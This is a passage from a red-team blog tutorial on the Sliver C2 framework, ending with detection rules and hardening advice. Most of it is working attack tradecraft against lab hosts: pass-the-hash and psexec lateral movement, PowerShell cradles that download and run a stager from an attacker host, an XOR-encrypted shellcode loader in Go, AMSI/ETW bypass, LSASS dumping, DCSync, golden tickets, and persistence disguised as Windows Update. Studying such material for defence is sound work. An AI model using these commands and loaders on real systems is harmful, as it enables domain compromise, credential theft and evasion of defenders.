root@root$ evil-winrm -i 127.0.0.1 -P 15985 -u administrator -p 'Admin@123!'

# Forward SMB for impacket
sliver (STEALTHY_WATCHER) > portfwd add --remote 10.129.229.10:445 --local 0.0.0.0:10445

# List active port forwards
sliver (STEALTHY_WATCHER) > portfwd
 ID  Remote Address          Local Address
====  ======================  ===================
  1  10.129.229.10:3389      0.0.0.0:13389
  2  10.129.229.10:5985      0.0.0.0:15985

# Remove
sliver (STEALTHY_WATCHER) > portfwd rm --id 1
```

### WireGuard Pivoting (VPN into Target Network)

With a WireGuard beacon, you get a full VPN-style tunnel into the target network.

```
# Generate WireGuard implant
[server] sliver > generate beacon --wg 10.10.14.55 --os windows --arch amd64 --save /tmp/wg_beacon.exe

# Start WireGuard listener
[server] sliver > wg --lport 51820

# After beacon checks in, set up port forward via WG tunnel
sliver (WG_BEACON) > wg-portfwd add --remote 10.129.229.10:3389
[*] WireGuard route added: 10.129.229.10:3389

# Direct RDP — no proxychains needed
root@root$ xfreerdp /v:10.129.229.10 /u:administrator /p:'Admin@123!'
```

---

## Scenario 3: Lateral Movement

**Goal:** Move from `DESKTOP-WIN11 (eliot)` to `DC01 (10.129.229.10)`

### Method 1: psexec (Built-In)

```
# psexec with credentials — drops service binary on target
sliver (STEALTHY_WATCHER) > psexec --hostname DC01.inlanefreight.local \
    --username administrator --password 'Admin@123!' \
    --service-name "WindowsUpdate" \
    --service-description "Windows Update Helper" \
    /tmp/COLD_MIST.exe

[*] Uploaded service binary to \\DC01\ADMIN$\COLD_MIST.exe
[*] Started service WindowsUpdate on DC01
[+] New beacon DC01_BEACON received
```

### Method 2: PsExec via SOCKS5 + Impacket

```
# With SOCKS5 proxy active
root@root$ proxychains4 impacket-psexec administrator:'Admin@123!'@10.129.229.10
Impacket v0.12.0 - Copyright 2023 Fortra
[*] Requesting shares on 10.129.229.10.....
[*] Found writable share ADMIN$
[*] Uploading file zXdfHNPx.exe
[*] Opening SVCManager on 10.129.229.10.....
[*] Creating service ... on 10.129.229.10.....
[*] Starting service .....
[!] Press help for extra shell commands
C:\Windows\system32> whoami
nt authority\system
```

### Method 3: WMI Execution

```
# Execute payload on DC via WMI (no service creation)
sliver (STEALTHY_WATCHER) > execute -o "wmic /node:10.129.229.10 /user:inlanefreight\administrator /password:Admin@123! process call create 'cmd.exe /c powershell -ep bypass -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.55/stager.ps1\")'"
```

### Method 4: WinRM / Evil-WinRM

```
# Through SOCKS5 proxy
root@root$ proxychains4 evil-winrm -i 10.129.229.10 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
Evil-WinRM shell v3.5
[*] Connecting to 10.129.229.10:5985
[*] Established connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
inlanefreight\administrator
```

### Method 5: Pass-the-Hash with CrackMapExec

```bash
root@root$ proxychains4 crackmapexec smb 10.129.229.10 \
    -u administrator -H '31d6cfe0d16ae931b73c59d7e0c089c0' \
    -x "whoami"
SMB   10.129.229.10  445  DC01  [*] Windows Server 2022 Build 20348 x64
SMB   10.129.229.10  445  DC01  [+] inlanefreight\administrator:31d6cfe... (Pwn3d!)
SMB   10.129.229.10  445  DC01  [+] Executed command via wmiexec
SMB   10.129.229.10  445  DC01  inlanefreight\administrator
```

### Method 6: Token Impersonation + New Beacon

```
# List active tokens on the system
sliver (STEALTHY_WATCHER) > impersonate administrator
[*] Successfully impersonated inlanefreight\administrator

# Now spawn a beacon as the impersonated user
sliver (STEALTHY_WATCHER) > execute-shellcode --process notepad.exe /tmp/admin_beacon.bin
```

---

## Beacon Object Files (BOF)

BOFs are small C programs compiled as COFF object files that execute **inside the existing implant process** — no new process spawned, no disk writes. Extremely OPSEC-friendly.

### Install coff-loader

```
[server] sliver > armory install coff-loader
[*] Installing coff-loader ...
```

### Use Built-In BOFs (via Armory aliases)

Many Armory entries are actually BOF wrappers:

```
# Credential BOFs
sliver (STEALTHY_WATCHER) > c2tc-kerbhash     # Kerberos hash extraction
sliver (STEALTHY_WATCHER) > c2tc-psc           # Process credentials
sliver (STEALTHY_WATCHER) > c2tc-psm           # Password manager extraction

# Recon BOFs
sliver (STEALTHY_WATCHER) > c2tc-domaininfo    # Domain info without spawning processes
sliver (STEALTHY_WATCHER) > c2tc-psx           # Process memory inspect

# Utility BOFs
sliver (STEALTHY_WATCHER) > c2tc-wdtoggle      # Toggle Windows Defender
sliver (STEALTHY_WATCHER) > remote-adduser     # Add local user remotely
sliver (STEALTHY_WATCHER) > remote-procdump    # Remote LSASS dump
```

### Write a Custom BOF

```bash
# Step 1: Install cross-compiler
root@root$ sudo apt install mingw-w64 -y

# Step 2: Get beacon.h
root@root$ mkdir ~/mybof && cd ~/mybof
root@root$ wget https://raw.githubusercontent.com/TrustedSec/CS-Situational-Awareness-BOF/master/src/common/beacon.h

# Step 3: Write BOF — list running services
root@root$ cat > services_bof.c << 'EOF'
#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenSCManagerA(LPCSTR, LPCSTR, DWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$EnumServicesStatusA(SC_HANDLE, DWORD, DWORD, LPENUM_SERVICE_STATUSA, DWORD, LPDWORD, LPDWORD, LPDWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE);

void go(char* args, int alen) {
    SC_HANDLE hSCM = KERNEL32$OpenSCManagerA(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (!hSCM) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to open SCManager\n");
        return;
    }

    DWORD bytesNeeded = 0, servicesReturned = 0, resumeHandle = 0;
    ADVAPI32$EnumServicesStatusA(hSCM, SERVICE_WIN32, SERVICE_STATE_ALL, NULL, 0, &bytesNeeded, &servicesReturned, &resumeHandle);

    LPENUM_SERVICE_STATUSA services = (LPENUM_SERVICE_STATUSA)malloc(bytesNeeded);
    if (ADVAPI32$EnumServicesStatusA(hSCM, SERVICE_WIN32, SERVICE_STATE_ALL, services, bytesNeeded, &bytesNeeded, &servicesReturned, &resumeHandle)) {
        for (DWORD i = 0; i < servicesReturned; i++) {
            BeaconPrintf(CALLBACK_OUTPUT, "[%s] %s - %s\n",
                services[i].ServiceStatus.dwCurrentState == SERVICE_RUNNING ? "RUNNING" : "STOPPED",
                services[i].lpServiceName,
                services[i].lpDisplayName);
        }
    }
    free(services);
    ADVAPI32$CloseServiceHandle(hSCM);
}
EOF

# Step 4: Compile for x64 and x86
root@root$ x86_64-w64-mingw32-gcc -o services_bof.x64.o -c services_bof.c -masm=intel
root@root$ i686-w64-mingw32-gcc   -o services_bof.x86.o -c services_bof.c -masm=intel

# Step 5: Create extension.json
root@root$ cat > extension.json << 'EOF'
{
  "name": "services-bof",
  "version": "1.0.0",
  "command_name": "services-bof",
  "help": "Enumerate Windows services via BOF",
  "long_help": "Lists all WIN32 services and their states",
  "depends_on": "coff-loader",
  "entrypoint": "go",
  "files": [
    { "os": "windows", "arch": "amd64", "path": "services_bof.x64.o" },
    { "os": "windows", "arch": "386",   "path": "services_bof.x86.o" }
  ],
  "arguments": []
}
EOF

# Step 6: Load into Sliver
[server] sliver > extensions load /root/mybof/
[*] Extension loaded: services-bof

# Step 7: Run it
sliver (STEALTHY_WATCHER) > services-bof
[RUNNING] AdobeARMservice - Adobe Acrobat Update Service
[RUNNING] BFE - Base Filtering Engine
[STOPPED] Browser - Computer Browser
...
```

---

## Evasion and OPSEC

### Built-In Evasion Features

Sliver includes several evasion features by default:

```
Symbol Obfuscation:  Enabled by default (--skip-symbols to disable for speed)
                     Randomizes Go symbol names using Garble
                     Makes static analysis harder

Unique certificates: Each implant gets unique X.509 certs signed by a per-instance CA
                     Different JARM fingerprints per engagement (if certs regenerated)

No hardcoded strings: C2 server address is compiled in but obfuscated
                      Protocol constants are obfuscated

DNS Canary Tokens:   Embed fake domains in implant — if queried, you know it's being analyzed
```

### Add DNS Canary Tokens

```
[server] sliver > generate beacon --mtls 10.10.14.55 \
    --canary analysis.microsoft-update.com \
    --canary cdn.windowsdefender.net \
    --os windows --arch amd64 --save /tmp/
[*] Canaries embedded: analysis.microsoft-update.com, cdn.windowsdefender.net

# Check if canaries were triggered (implant being analyzed)
[server] sliver > canaries
 Domain                          Implant Name        First Trigger   Latest Trigger
==============================   ==================  ==============  ==============
 analysis.microsoft-update.com   STEALTHY_WATCHER    Never           Never
```

If a canary fires, you know IR is analyzing your binary and you should rotate infrastructure.

### Skip Symbol Obfuscation (Faster Build)

For lab/testing where speed matters:

```
[server] sliver > generate beacon --mtls 10.10.14.55 --skip-symbols --os windows --arch amd64 --save /tmp/
[!] Symbol obfuscation is DISABLED - binary may be easier to detect
[*] Build completed in 00:00:08  (vs 00:01:12 with obfuscation)
```

### Staged Payload for AV Evasion

The staged approach keeps the initial dropper small and signature-free:

```
# Profile with skip-symbols + shellcode format (for custom loader)
[server] sliver > profiles new beacon \
    --http 10.10.14.55:8080 \
    --os windows --arch amd64 \
    --format shellcode \
    --seconds 60 --jitter 20 \
    evasion-profile

# Generate stager (tiny, clean, no Sliver signatures)
[server] sliver > stage-listener --url http://10.10.14.55:8080 --profile evasion-profile
[server] sliver > generate stager --lhost 10.10.14.55 --lport 8080 --arch amd64 --format shellcode --save /tmp/
```

Then use a custom shellcode loader (Go/Rust/C#) that encrypts the stager and injects it — keeping Defender from seeing raw shellcode.

### Golang Shellcode Loader Template

```go
// loader.go — simple XOR-encrypted shellcode runner
package main

import (
    "os"
    "unsafe"
    "syscall"
    "encoding/hex"
)

var (
    kernel32      = syscall.MustLoadDLL("kernel32.dll")
    VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
    RtlCopyMemory = kernel32.MustFindProc("RtlCopyMemory")
    CreateThread  = kernel32.MustFindProc("CreateThread")
    WaitForSingleObject = kernel32.MustFindProc("WaitForSingleObject")
)

func xorDecode(data []byte, key byte) []byte {
    result := make([]byte, len(data))
    for i, b := range data {
        result[i] = b ^ key
    }
    return result
}

func main() {
    // XOR-encoded Sliver shellcode (key: 0x41)
    encodedHex := "ENCODED_SHELLCODE_HEX_HERE"
    encoded, _ := hex.DecodeString(encodedHex)
    shellcode := xorDecode(encoded, 0x41)

    addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), 0x3000, 0x40)
    _, _, _ = RtlCopyMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
    handle, _, _ := CreateThread.Call(0, 0, addr, 0, 0, 0)
    WaitForSingleObject.Call(handle, 0xFFFFFFFF)
    os.Exit(0)
}
```

```bash
# Cross-compile for Windows
root@root$ GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o loader.exe loader.go
root@root$ upx loader.exe  # Optional: further compress
```

### Reflective DLL Injection (via Donut)

```bash
# Convert Sliver DLL implant to PIC shellcode with Donut
root@root$ pip3 install donut-shellcode
root@root$ python3 -c "
import donut
sc = donut.create(file='/tmp/DARK_FALCON.dll', arch=3)
open('/tmp/falcon_shellcode.bin','wb').write(sc)
"
```

### In-Session AMSI/ETW Bypass

When using `execute-assembly`, pass AMSI/ETW bypass flags:

```
sliver (STEALTHY_WATCHER) > execute-assembly --in-process --amsi-bypass --etw-bypass /opt/Seatbelt.exe -group=All
```

---

## Persistence

### Method 1: Registry Run Key

```
sliver (STEALTHY_WATCHER) > registry write \
    --hive HKCU \
    --path "Software\Microsoft\Windows\CurrentVersion\Run" \
    --key "WindowsUpdateHelper" \
    --string "C:\Windows\Temp\beacon.exe"
```

### Method 2: Scheduled Task

```
sliver (STEALTHY_WATCHER) > execute -o "schtasks /create /tn 'MicrosoftEdgeUpdate' /tr 'C:\Windows\Temp\beacon.exe' /sc DAILY /st 09:00 /ru SYSTEM /f"
```

### Method 3: Service Installation

```
# Generate a service binary
[server] sliver > generate beacon --mtls 10.10.14.55 --format service --save /tmp/svc_beacon.exe

# Upload and install
sliver (STEALTHY_WATCHER) > upload /tmp/svc_beacon.exe C:\Windows\Temp\svc_beacon.exe
sliver (STEALTHY_WATCHER) > execute -o "sc create WindowsDefenderHelper binpath= C:\Windows\Temp\svc_beacon.exe start= auto"
sliver (STEALTHY_WATCHER) > execute -o "sc start WindowsDefenderHelper"
```

### Method 4: WMI Subscription (Fileless Persistence)

```
# Create WMI event subscription via BOF / execute-assembly
sliver (STEALTHY_WATCHER) > execute -o powershell -c "
\$FilterArgs = @{
    Name='WindowsUpdate';
    EventNamespace='root/cimv2';
    QueryLanguage='WQL';
    Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120\"
}
\$Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments \$FilterArgs
\$ConsumerArgs = @{Name='WindowsUpdate'; CommandLineTemplate='C:\Windows\Temp\beacon.exe'}
\$Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments \$ConsumerArgs
Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter=\$Filter; Consumer=\$Consumer}
"
```

---

## Loot Management

Sliver tracks all collected data in a "loot" system — files, credentials, screenshots.

```
# View collected loot
[server] sliver > loot
 ID          Name                   Type        Size
==========   ====================   =========   ======
 abc-001     lsass_dump             file        24.3MB
 abc-002     seatbelt_output        text        142KB
 abc-003     screenshot_1           file        1.2MB
 abc-004     nanodump_lsass.dmp     file        18.1MB

# Fetch a loot item
[server] sliver > loot fetch abc-001

# Add a file to loot manually
sliver (STEALTHY_WATCHER) > download C:\Users\eliot\AppData\Roaming\Mozilla\Firefox\Profiles\*.default\logins.json
[*] Saved to loot: logins.json
```

---

## Scenario 4: Full Domain Compromise Walkthrough

**Goal:** From low-privileged foothold on `DESKTOP-WIN11` to Domain Admin on DC01

```
Step 1: Initial beacon received (eliot on DESKTOP-WIN11)
Step 2: Enumerate AD with SharpHound → import to BloodHound
Step 3: Find Kerberoastable service account (MSSQLSvc)
Step 4: Kerberoast → crack hash → get svc account password
Step 5: Check if svc account has local admin on any machine
Step 6: Lateral move to machine where svc account is admin
Step 7: Dump LSASS → find domain admin creds in memory
Step 8: PSExec/WMI to DC01 → full domain compromise
Step 9: DCSync → dump all domain hashes
Step 10: Golden Ticket → persistent domain access
```

### Step 2: SharpHound + BloodHound

```
sliver (STEALTHY_WATCHER) > execute-assembly --in-process --amsi-bypass /opt/SharpHound.exe -c All --zipfilename enum.zip
sliver (STEALTHY_WATCHER) > download C:\Windows\Temp\20260319_enum.zip
```

### Step 3-4: Kerberoast → Crack

```
sliver (STEALTHY_WATCHER) > execute-assembly --in-process --amsi-bypass /opt/Rubeus.exe kerberoast /format:hashcat /nowrap
# Copy $krb5tgs$ hash to file
root@root$ hashcat -m 13100 svc_hash.txt /usr/share/wordlists/rockyou.txt --force
# Cracked: MSSQLSvc : Service@2024!
```

### Step 5-6: Check local admin access

```bash
root@root$ proxychains4 crackmapexec smb 10.129.229.0/24 \
    -u MSSQLSvc -p 'Service@2024!' \
    --local-auth
SMB  10.129.229.50  445  SQL01  [+] SQL01\MSSQLSvc:Service@2024! (Pwn3d!)
```

### Step 7: Get beacon on SQL01, dump LSASS

```
# Generate new beacon, deliver to SQL01 via SMB
root@root$ proxychains4 impacket-psexec 'MSSQLSvc:Service@2024!@10.129.229.50' cmd
C:\> powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.55/stager.ps1')"
# New beacon SQL01_BEACON received

[server] sliver > use SQL01_BEACON
sliver (SQL01_BEACON) > interactive
sliver (SQL01_BEACON) > nanodump
sliver (SQL01_BEACON) > download lsass.dmp
```

```bash
root@root$ pypykatz lsa minidump lsass.dmp
# Found: administrator : Admin@2024Domain!
```

### Step 8-9: DCSync

```bash
# DCSync via proxychains
root@root$ proxychains4 impacket-secretsdump 'inlanefreight.local/administrator:Admin@2024Domain!@10.129.229.10'
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:KRBTGT_HASH_HERE:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:KRBTGT_HASH:::
eliot:1105:aad3b435b51404eeaad3b435b51404ee:USER_HASH:::
...
```

### Step 10: Golden Ticket

```bash
root@root$ proxychains4 impacket-ticketer \
    -nthash <KRBTGT_HASH> \
    -domain-sid <DOMAIN_SID> \
    -domain inlanefreight.local \
    administrator

root@root$ export KRB5CCNAME=administrator.ccache
root@root$ proxychains4 impacket-wmiexec -k -no-pass \
    'inlanefreight.local/administrator@DC01.inlanefreight.local'
[*] SMBv3.0 dialect used
C:\> whoami
inlanefreight\administrator
```

---

## Armory Reference

The Armory is Sliver's built-in package manager.

```
# List all available packages
[server] sliver > armory

# Search
[server] sliver > armory search rubeus

# Install specific package
[server] sliver > armory install Rubeus
[server] sliver > armory install SharpHound
[server] sliver > armory install nanodump
[server] sliver > armory install mimikatz
[server] sliver > armory install Certify
[server] sliver > armory install Seatbelt
[server] sliver > armory install coff-loader
[server] sliver > armory install SharpView
[server] sliver > armory install remote-adduser
[server] sliver > armory install c2tc-domaininfo

# Update all
[server] sliver > armory update

# View installed aliases/extensions
[server] sliver > aliases
[server] sliver > extensions
```

**Key Armory Packages:**

| Package | Category | Usage |
|---------|----------|-------|
| `Rubeus` | Kerberos | TGT/TGS requests, Kerberoasting, AS-REP, Pass-the-Ticket |
| `Seatbelt` | Recon | Host enumeration (100+ checks) |
| `SharpHound` | AD Recon | BloodHound data collector |
| `nanodump` | Credential | LSASS dump (OPSEC-friendly) |
| `mimikatz` | Credential | Full credential extraction |
| `Certify` | AD CS | Certificate template abuse |
| `SharpView` | AD Recon | PowerView port to C# |
| `coff-loader` | BOF | Execute BOF extensions |
| `c2tc-domaininfo` | BOF/Recon | Domain info via BOF |
| `c2tc-kerbhash` | BOF/Cred | Kerberos hash via BOF |
| `remote-adduser` | Persistence | Add local admin via BOF |
| `remote-procdump` | Credential | Remote LSASS dump |

---

## Command Cheatsheet

### Listeners

```
mtls                            Start mTLS listener (default port 8888)
https                           Start HTTPS listener (default port 443)
http                            Start HTTP listener (default port 80)
dns --domains c2.domain.com     Start DNS listener
wg                              Start WireGuard listener (default UDP 51820)
jobs                            List active listeners
jobs --kill <ID>                Stop a listener
```

### Implant Generation

```
generate beacon --mtls <IP>     Generate mTLS beacon EXE
generate --https <IP>           Generate HTTPS session EXE
generate beacon --dns <domain>  Generate DNS beacon
generate beacon --wg <IP>       Generate WireGuard beacon
generate ... --format shellcode Generate raw shellcode
generate ... --format shared    Generate DLL
generate ... --format service   Generate Windows service binary
generate ... --os linux         Linux ELF
generate ... --os darwin        macOS binary
generate ... --seconds 60 --jitter 20   Beacon interval settings
generate ... --skip-symbols     Disable Go obfuscation (faster build)
generate stager                 Generate small stager dropper
profiles new                    Save implant profile
profiles generate <name>        Generate from profile
```

### Session/Beacon Management

```
sessions                        List active sessions
beacons                         List active beacons
use <ID>                        Interact with session/beacon
interactive                     Convert beacon → session
info                            Show implant info
kill <ID>                       Kill implant
```

### Post-Exploitation (in-session)

```
whoami                          Current user
getprivs                        Token privileges
getsystem                       Attempt SYSTEM elevation
ps                              Process list
info                            Session info
ifconfig                        Network interfaces
netstat                         Active connections
screenshot                      Take screenshot
ls / pwd / cd / cat             File system navigation
upload / download               File transfer
execute -o <cmd>                Run command, get output
shell                           Interactive shell (avoid)
migrate --pid <PID>             Migrate implant to process
execute-shellcode               Inject shellcode
execute-assembly                Run .NET assembly in-memory
registry read/write/delete      Registry ops
```

### Pivoting

```
socks5 start --port 1080        SOCKS5 proxy (session only)
socks5 stop                     Stop proxy
portfwd add --remote <IP:port>  TCP port forward
portfwd rm --id <ID>            Remove port forward
portfwd                         List forwards
wg-portfwd add                  WireGuard port forward
```

### Credentials / Loot

```
hashdump                        SAM database dump (admin)
procdump --pid <LSASS_PID>      Dump LSASS
nanodump                        Armory: OPSEC LSASS dump
mimikatz sekurlsa::logonpasswords  Full credential extract
rubeus kerberoast               Kerberoast via Rubeus
loot                            View collected loot
loot fetch <ID>                 Download loot item
```

### Armory / BOF

```
armory install <name>           Install package
armory update                   Update all packages
aliases                         List installed aliases
extensions                      List installed extensions
extensions load <path>          Load custom extension/BOF
```

---

## Detection: Blue Team Perspective

### Default Sliver Network Signatures (Change These!)

| Protocol | Default Port | Detection |
|----------|-------------|-----------|
| mTLS | TCP 8888 | Unusual TLS on non-standard port; JARM hash `00000000000000000043d43d00043de2a97eabb398317329f027c66e4c1b01` |
| HTTPS | TCP 443 | URL patterns: `.php`, `.js`, `.html`, `.png`, `.woff` with random directory paths |
| WireGuard | UDP 51820 | Any WireGuard traffic from workstations |
| Multiplayer | TCP 31337 | gRPC traffic on 31337 |
| DNS | UDP 53 | Very long subdomain labels with Base58-encoded random strings, high-frequency queries |

### Sysmon Detection Rules

**Rule 1 — Sliver Beacon Process Spawning Sacrificial Process**

```yaml
title: Potential Sliver Implant Sacrificial Process Creation
id: f1c2e3d4-5678-90ab-cdef-1234567890ab
status: experimental
description: Detects process injection pattern used by Sliver execute-assembly
tags:
  - attack.defense-evasion
  - attack.t1055
  - attack.t1059.001
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith:
      - '\notepad.exe'
      - '\calc.exe'
      - '\mspaint.exe'
    Image|endswith:
      - '\notepad.exe'
      - '\calc.exe'
    CommandLine|contains:
      - '-NoExit'
      - '-EncodedCommand'
  condition: selection
level: high
```

**Rule 2 — Sliver LSASS Access**

```yaml
title: Potential Sliver nanodump/procdump LSASS Access
id: a2b3c4d5-6789-01bc-def0-234567890abc
status: experimental
tags:
  - attack.credential-access
  - attack.t1003.001
logsource:
  category: process_access
  product: windows
detection:
  selection:
    TargetImage|endswith: '\lsass.exe'
    GrantedAccess|contains:
      - '0x1010'
      - '0x1410'
      - '0x1438'
      - '0x143a'
      - '0x1fffff'
  filter_legit:
    SourceImage|endswith:
      - '\MsMpEng.exe'
      - '\csrss.exe'
      - '\wininit.exe'
  condition: selection and not filter_legit
level: critical
```

**Rule 3 — mTLS on Non-Standard Port**

```yaml
title: Sliver mTLS C2 Non-Standard Port
id: c3d4e5f6-789a-bcde-f012-34567890abcd
status: experimental
tags:
  - attack.command-and-control
  - attack.t1573.002
logsource:
  category: network_connection
  product: windows
detection:
  selection:
    Initiated: 'true'
    DestinationPort: 8888
    Protocol: tcp
  filter_legit:
    DestinationIp|startswith:
      - '10.'
      - '192.168.'
      - '172.16.'
  condition: selection and not filter_legit
level: high
```

**Rule 4 — Sliver Go Binary (Large Static Binary)**

```yaml
title: Large Go Binary Executed from Temp Directory
id: d4e5f6a7-89ab-cdef-0123-4567890abcde
status: experimental
description: Sliver implants are large Go binaries, often >8MB, run from temp paths
tags:
  - attack.execution
  - attack.t1059
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|contains:
      - '\Temp\'
      - '\AppData\'
      - '\ProgramData\'
    Image|endswith: '.exe'
  filter_signed:
    Signed: 'true'
  condition: selection and not filter_signed
level: medium
```

### Splunk Queries

**Query 1 — DNS C2 (Long Subdomain Labels)**

```spl
index=dns
| eval label_length=len(subdomain)
| where label_length > 40
| stats count by src_ip, subdomain, query
| where count > 10
| sort -count
```

**Query 2 — Sliver HTTPS URL Pattern**

```spl
index=proxy sourcetype=squid OR sourcetype=bluecoat
(uri_path="*.php" OR uri_path="*.js" OR uri_path="*.woff" OR uri_path="*.png")
uri_path=*/*/
| where like(uri_path, "%/%/%")
| rex field=uri_path "(?<dir1>[^/]+)/(?<dir2>[^/]+)/(?<file>[^?]+)"
| eval entropy=mvcount(split(dir1,""))
| where entropy > 12
| stats count by src_ip, uri_path, dest
| sort -count
```

**Query 3 — Unusual Port 8888 TLS**

```spl
index=network dest_port=8888 transport=tcp
| stats count by src_ip, dest_ip, dest_port
| where count > 5
| sort -count
```

**Query 4 — LSASS Access by Non-System Processes**

```spl
index=windows source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=10
TargetImage="*lsass.exe"
NOT (SourceImage="*MsMpEng.exe" OR SourceImage="*csrss.exe" OR SourceImage="*wininit.exe")
| table _time, ComputerName, SourceImage, GrantedAccess, User
| sort -_time
```

---

## MITRE ATT&CK Mapping

| Tactic | ID | Technique | Sliver Feature |
|--------|----|-----------|----------------|
| Execution | T1059.001 | PowerShell | `execute -o powershell` |
| Execution | T1047 | WMI | `wmic` via execute |
| Persistence | T1053.005 | Scheduled Task | schtasks via execute |
| Persistence | T1543.003 | Windows Service | service binary format |
| Privilege Escalation | T1548.002 | UAC Bypass | getsystem |
| Defense Evasion | T1055 | Process Injection | inject, migrate |
| Defense Evasion | T1027 | Obfuscation | symbol obfuscation, Garble |
| Defense Evasion | T1140 | Deobfuscate/Decode | stager + XOR loader |
| Defense Evasion | T1562.001 | AMSI Bypass | execute-assembly --amsi-bypass |
| Credential Access | T1003.001 | LSASS Memory | nanodump, procdump |
| Credential Access | T1558.003 | Kerberoasting | Rubeus via armory |
| Discovery | T1082 | System Info | sysinfo, execute -o systeminfo |
| Discovery | T1069 | Group Enumeration | SharpView, net commands |
| Lateral Movement | T1021.001 | RDP | portfwd + xfreerdp |
| Lateral Movement | T1021.006 | WinRM | portfwd + evil-winrm |
| Lateral Movement | T1077 | SMB | psexec built-in |
| C2 | T1071.001 | HTTP/S | http/https listener |
| C2 | T1071.004 | DNS | dns listener |
| C2 | T1573.002 | mTLS | mtls listener |
| C2 | T1572 | Protocol Tunnel | WireGuard listener |
| C2 | T1090.001 | SOCKS5 | socks5 command |
| Exfiltration | T1041 | C2 Channel | download + loot |
| Collection | T1113 | Screenshot | screenshot command |

---

## Hardening Against Sliver

| Control | Mitigation |
|---------|-----------|
| Network segmentation | Block outbound on non-standard ports (8888, 51820, 31337) |
| DNS filtering | Block DNS queries with base58-encoded subdomains, long labels |
| EDR tuning | Alert on Go binaries from temp paths, large static ELF/PE |
| LSASS protection | Enable PPL (Protected Process Light) for lsass.exe |
| AppLocker/WDAC | Block unsigned executables from temp/appdata paths |
| JA3/JARM | Fingerprint and block known Sliver TLS handshakes |
| PowerShell logging | Script block + module logging to catch in-session commands |
| AMSI | Keep Defender/EDR patched — AMSI bypass via execute-assembly is detectable |
| Credential Guard | Enable Windows Credential Guard to protect LSASS |
| Network NDR | Deploy Zeek/Corelight with Sliver detection package |

---

## Summary

Sliver is one of the most capable open-source C2 frameworks available today. Its combination of:

- **4 transport protocols** (mTLS, WireGuard, HTTP/S, DNS) for flexible evasion
- **Session and beacon modes** for OPSEC-tunable operations
- **Built-in pivoting** (SOCKS5, port forward, WireGuard routing)
- **execute-assembly** (in-memory .NET via Donut)
- **BOF support** via coff-loader for OPSEC-friendly capability execution
- **Armory** ecosystem with Rubeus, Seatbelt, nanodump, SharpHound, Certify

...makes it a complete red team platform capable of taking operations from initial beacon all the way through domain compromise.

The fact that APT29 (Russian SVR) has been confirmed using Sliver in real intrusions is the clearest signal that this is production-grade offensive infrastructure — not a toy framework.

---

*Blog by Hossam Ayman Saeed (Hossam Shady) — Security Engineer / Red Teamer*  
*Instructor @ EC-Council | CRTP | CRTA | CPTS | eCPPT | eWAPT | eJPT | HTB ProLabs*
